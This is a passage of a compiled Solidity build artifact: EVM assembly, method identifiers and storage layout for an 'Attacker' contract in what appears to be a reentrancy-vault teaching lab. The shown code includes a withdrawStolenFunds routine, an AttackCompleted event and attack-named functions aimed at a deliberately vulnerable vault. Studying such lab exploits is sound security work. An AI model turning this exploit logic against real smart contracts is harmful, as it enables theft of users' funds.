0x20\n        /* \"#utility.yul\":788:806   */\n      add\n      swap1\n        /* \"#utility.yul\":669:846   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1636:1664  AttackCompleted(totalStolen) */\n    tag_141:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":730:1671  function attack() external payable override {... */\n      jump\t// out\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4124:4242  function getVaultBalance() external view override returns (uint256) {... */\n    tag_65:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4183:4190  uint256 */\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4209:4214  vault */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4209:4233  vault.getContractBalance */\n      and\n      0x6f9fb98a\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4209:4235  vault.getContractBalance() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_89\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3527:3868  function withdrawStolenFunds() external override {... */\n    tag_74:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3604:3625  address(this).balance */\n      selfbalance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3643:3654  balance > 0 */\n      dup1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3635:3679  require(balance > 0, \"No funds to withdraw\") */\n      tag_147\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4017:4019   */\n      0x20\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3635:3679  require(balance > 0, \"No funds to withdraw\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3999:4020   */\n      mstore\n        /* \"#utility.yul\":4056:4058   */\n      0x14\n        /* \"#utility.yul\":4036:4054   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4029:4059   */\n      mstore\n      shl(0x60, 0x4e6f2066756e647320746f207769746864726177)\n        /* \"#utility.yul\":4075:4093   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4068:4118   */\n      mstore\n        /* \"#utility.yul\":4135:4153   */\n      0x64\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3635:3679  require(balance > 0, \"No funds to withdraw\") */\n      tag_94\n        /* \"#utility.yul\":3815:4159   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3635:3679  require(balance > 0, \"No funds to withdraw\") */\n    tag_147:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3717:3752  msg.sender.call{value: balance}(\"\") */\n      mload(0x40)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3699:3711  bool success */\n      0x00\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3717:3727  msg.sender */\n      caller\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3740:3747  balance */\n      dup4\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3699:3711  bool success */\n      dup4\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3717:3752  msg.sender.call{value: balance}(\"\") */\n      dup2\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3699:3711  bool success */\n      dup2\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3717:3752  msg.sender.call{value: balance}(\"\") */\n      dup2\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3740:3747  balance */\n      dup6\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3717:3727  msg.sender */\n      dup8\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3717:3752  msg.sender.call{value: balance}(\"\") */\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_154\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_153)\n    tag_154:\n      0x60\n      swap2\n      pop\n    tag_153:\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3698:3752  (bool success, ) = msg.sender.call{value: balance}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3770:3777  success */\n      dup1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3762:3797  require(success, \"Transfer failed\") */\n      tag_155\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4576:4578   */\n      0x20\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3762:3797  require(success, \"Transfer failed\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4558:4579   */\n      mstore\n        /* \"#utility.yul\":4615:4617   */\n      0x0f\n        /* \"#utility.yul\":4595:4613   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4588:4618   */\n      mstore\n      shl(0x8a, 0x151c985b9cd9995c8819985a5b1959)\n        /* \"#utility.yul\":4634:4652   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4627:4672   */\n      mstore\n        /* \"#utility.yul\":4689:4707   */\n      0x64\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3762:3797  require(success, \"Transfer failed\") */\n      tag_94\n        /* \"#utility.yul\":4374:4713   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3762:3797  require(success, \"Transfer failed\") */\n    tag_155:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3816:3861  console.log(\"Stolen ETH withdrawn:\", balance) */\n      tag_76\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x15\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x59, 0x29ba37b632b71022aa24103bb4ba34323930bbb71d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3853:3860  balance */\n      dup4\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3816:3827  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3816:3861  console.log(\"Stolen ETH withdrawn:\", balance) */\n      jump\t// in\n        /* \"lib/forge-std/src/console.sol\":851:980  function _sendLogPayload(bytes memory payload) internal pure {... */\n    tag_79:\n        /* \"lib/forge-std/src/console.sol\":922:973  _castToPure(_sendLogPayloadImplementation)(payload) */\n      tag_81\n        /* \"lib/forge-std/src/console.sol\":965:972  payload */\n      dup2\n        /* \"lib/forge-std/src/console.sol\":265:287  address consoleAddress */\n      0x00\n        /* \"lib/forge-std/src/console.sol\":131:173  0x000000000000000000636F6e736F6c652e6c6f67 */\n      0x636f6e736f6c652e6c6f67\n        /* \"lib/forge-std/src/console.sol\":265:305  address consoleAddress = CONSOLE_ADDRESS */\n      swap1\n      pop\n        /* \"lib/forge-std/src/console.sol\":594:595  0 */\n      0x00\n        /* \"lib/forge-std/src/console.sol\":571:572  0 */\n      dup1\n        /* \"lib/forge-std/src/console.sol\":541:548  payload */\n      dup4\n        /* \"lib/forge-std/src/console.sol\":535:549  mload(payload) */\n      mload\n        /* \"lib/forge-std/src/console.sol\":510:512  32 */\n      0x20\n        /* \"lib/forge-std/src/console.sol\":501:508  payload */\n      dup6\n        /* \"lib/forge-std/src/console.sol\":497:513  add(payload, 32) */\n      add\n        /* \"lib/forge-std/src/console.sol\":461:475  consoleAddress */\n      dup5\n        /* \"lib/forge-std/src/console.sol\":434:439  gas() */\n      gas\n        /* \"lib/forge-std/src/console.sol\":402:613  staticcall(... */\n      staticcall\n        /* \"lib/forge-std/src/console.sol\":381:627  pop(... */\n      pop\n        /* \"lib/forge-std/src/console.sol\":367:637  {... */\n      pop\n        /* \"lib/forge-std/src/console.sol\":180:643  function _sendLogPayloadImplementation(bytes memory payload) internal view {... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":14:141   */\n    tag_169:\n        /* \"#utility.yul\":75:85   */\n      0x4e487b71\n        /* \"#utility.yul\":70:73   */\n      0xe0\n        /* \"#utility.yul\":66:86   */\n      shl\n        /* \"#utility.yul\":63:64   */\n      0x00\n        /* \"#utility.yul\":56:87   */\n      mstore\n        /* \"#utility.yul\":106:110   */\n      0x11\n        /* \"#utility.yul\":103:104   */\n      0x04\n        /* \"#utility.yul\":96:111   */\n      mstore\n        /* \"#utility.yul\":130:134   */\n      0x24\n        /* \"#utility.yul\":127:128   */\n      0x00\n        /* \"#utility.yul\":120:135   */\n      revert\n        /* \"#utility.yul\":146:271   */\n    tag_20:\n        /* \"#utility.yul\":211:220   */\n      dup1\n      dup3\n      add\n        /* \"#utility.yul\":232:242   */\n      dup1\n      dup3\n      gt\n        /* \"#utility.yul\":229:265   */\n      iszero\n      tag_175\n      jumpi\n        /* \"#utility.yul\":245:263   */\n      tag_175\n      tag_169\n      jump\t// in\n    tag_175:\n        /* \"#utility.yul\":146:271   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":276:411   */\n    tag_22:\n        /* \"#utility.yul\":315:318   */\n      0x00\n        /* \"#utility.yul\":336:353   */\n      0x01\n      dup3\n      add\n        /* \"#utility.yul\":333:376   */\n      tag_178\n      jumpi\n        /* \"#utility.yul\":356:374   */\n      tag_178\n      tag_169\n      jump\t// in\n    tag_178:\n      pop\n        /* \"#utility.yul\":403:404   */\n      0x01\n        /* \"#utility.yul\":392:405   */\n      add\n      swap1\n        /* \"#utility.yul\":276:411   */\n      jump\t// out\n        /* \"#utility.yul\":1416:1839   */\n    tag_170:\n        /* \"#utility.yul\":1458:1461   */\n      0x00\n        /* \"#utility.yul\":1496:1501   */\n      dup2\n        /* \"#utility.yul\":1490:1502   */\n      mload\n        /* \"#utility.yul\":1523:1529   */\n      dup1\n        /* \"#utility.yul\":1518:1521   */\n      dup5\n        /* \"#utility.yul\":1511:1530   */\n      mstore\n        /* \"#utility.yul\":1548:1549   */\n      0x00\n        /* \"#utility.yul\":1558:1720   */\n    tag_184:\n        /* \"#utility.yul\":1572:1578   */\n      dup2\n        /* \"#utility.yul\":1569:1570   */\n      dup2\n        /* \"#utility.yul\":1566:1579   */\n      lt\n        /* \"#utility.yul\":1558:1720   */\n      iszero\n      tag_186\n      jumpi\n        /* \"#utility.yul\":1634:1638   */\n      0x20\n        /* \"#utility.yul\":1690:1703   */\n      dup2\n      dup6\n      add\n        /* \"#utility.yul\":1686:1708   */\n      dup2\n      add\n        /* \"#utility.yul\":1680:1709   */\n      mload\n        /* \"#utility.yul\":1662:1673   */\n      dup7\n      dup4\n      add\n        /* \"#utility.yul\":1658:1678   */\n      dup3\n      add\n        /* \"#utility.yul\":1651:1710   */\n      mstore\n        /* \"#utility.yul\":1587:1599   */\n      add\n        /* \"#utility.yul\":1558:1720   */\n      jump(tag_184)\n    tag_186:\n        /* \"#utility.yul\":1562:1565   */\n      pop\n        /* \"#utility.yul\":1765:1766   */\n      0x00\n        /* \"#utility.yul\":1758:1762   */\n      0x20\n        /* \"#utility.yul\":1749:1755   */\n      dup3\n        /* \"#utility.yul\":1744:1747   */\n      dup7\n        /* \"#utility.yul\":1740:1756   */\n      add\n        /* \"#utility.yul\":1736:1763   */\n      add\n        /* \"#utility.yul\":1729:1767   */\n      mstore\n        /* \"#utility.yul\":1828:1832   */\n      0x20\n        /* \"#utility.yul\":1821:1823   */\n      0x1f\n        /* \"#utility.yul\":1817:1824   */\n      not\n        /* \"#utility.yul\":1812:1814   */\n      0x1f\n        /* \"#utility.yul\":1804:1810   */\n      dup4\n        /* \"#utility.yul\":1800:1815   */\n      add\n        /* \"#utility.yul\":1796:1825   */\n      and\n        /* \"#utility.yul\":1791:1794   */\n      dup6\n        /* \"#utility.yul\":1787:1826   */\n      add\n        /* \"#utility.yul\":1783:1833   */\n      add\n        /* \"#utility.yul\":1776:1833   */\n      swap2\n      pop\n      pop\n        /* \"#utility.yul\":1416:1839   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1844:2135   */\n    tag_78:\n        /* \"#utility.yul\":2021:2023   */\n      0x40\n        /* \"#utility.yul\":2010:2019   */\n      dup2\n        /* \"#utility.yul\":2003:2024   */\n      mstore\n        /* \"#utility.yul\":1984:1988   */\n      0x00\n        /* \"#utility.yul\":2041:2086   */\n      tag_188\n        /* \"#utility.yul\":2082:2084   */\n      0x40\n        /* \"#utility.yul\":2071:2080   */\n      dup4\n        /* \"#utility.yul\":2067:2085   */\n      add\n        /* \"#utility.yul\":2059:2065   */\n      dup6\n        /* \"#utility.yul\":2041:2086   */\n      tag_170\n      jump\t// in\n    tag_188:\n        /* \"#utility.yul\":2033:2086   */\n      swap1\n      pop\n        /* \"#utility.yul\":2122:2128   */\n      dup3\n        /* \"#utility.yul\":2117:2119   */\n      0x20\n        /* \"#utility.yul\":2106:2115   */\n      dup4\n        /* \"#utility.yul\":2102:2120   */\n      add\n        /* \"#utility.yul\":2095:2129   */\n      mstore\n        /* \"#utility.yul\":1844:2135   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2140:2360   */\n    tag_83:\n        /* \"#utility.yul\":2289:2291   */\n      0x20\n        /* \"#utility.yul\":2278:2287   */\n      dup2\n        /* \"#utility.yul\":2271:2292   */\n      mstore\n        /* \"#utility.yul\":2252:2256   */\n      0x00\n        /* \"#utility.yul\":2309:2354   */\n      tag_190\n        /* \"#utility.yul\":2350:2352   */\n      0x20\n        /* \"#utility.yul\":2339:2348   */\n      dup4\n        /* \"#utility.yul\":2335:2353   */\n      add\n        /* \"#utility.yul\":2327:2333   */\n      dup5\n        /* \"#utility.yul\":2309:2354   */\n      tag_170\n      jump\t// in\n    tag_190:\n        /* \"#utility.yul\":2301:2354   */\n      swap4\n        /* \"#utility.yul\":2140:2360   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2573:2757   */\n    tag_91:\n        /* \"#utility.yul\":2643:2649   */\n      0x00\n        /* \"#utility.yul\":2696:2698   */\n      0x20\n        /* \"#utility.yul\":2684:2693   */\n      dup3\n        /* \"#utility.yul\":2675:2682   */\n      dup5\n        /* \"#utility.yul\":2671:2694   */\n      sub\n        /* \"#utility.yul\":2667:2699   */\n      slt\n        /* \"#utility.yul\":2664:2716   */\n      iszero\n      tag_193\n      jumpi\n        /* \"#utility.yul\":2712:2713   */\n      0x00\n        /* \"#utility.yul\":2709:2710   */\n      dup1\n        /* \"#utility.yul\":2702:2714   */\n      revert\n        /* \"#utility.yul\":2664:2716   */\n    tag_193:\n      pop\n        /* \"#utility.yul\":2735:2751   */\n      mload\n      swap2\n        /* \"#utility.yul\":2573:2757   */\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220e9ebbaffececd26e71ba84054a33f86a42d5965001bdb9cbb3ecaf2db84b870c64736f6c63430008140033\n}\n","methodIdentifiers":{"attack()":"9e5faafc","attackCount()":"407c2821","attackDepositBonus()":"50a63df1","attackEmergencyWithdraw()":"7dd0ddf9","getAttackStats()":"0777586a","getVaultBalance()":"ed12e8ef","getVaultUserBalance()":"1f22e4b3","totalStolen()":"d9f9d5f2","vault()":"fbfa77cf","withdrawStolenFunds()":"fd276754"},"storageLayout":{"storage":[{"astId":40803,"contract":"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol:Attacker","label":"vault","offset":0,"slot":"0","type":"t_contract(VulnerableVault)41405"},{"astId":40806,"contract":"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol:Attacker","label":"attackCount","offset":0,"slot":"1","type":"t_uint256"},{"astId":40809,"contract":"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol:Attacker","label":"totalStolen","offset":0,"slot":"2","type":"t_uint256"}],"types":{"t_contract(VulnerableVault)41405":{"encoding":"inplace","label":"contract VulnerableVault","numberOfBytes":"20"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"id":25}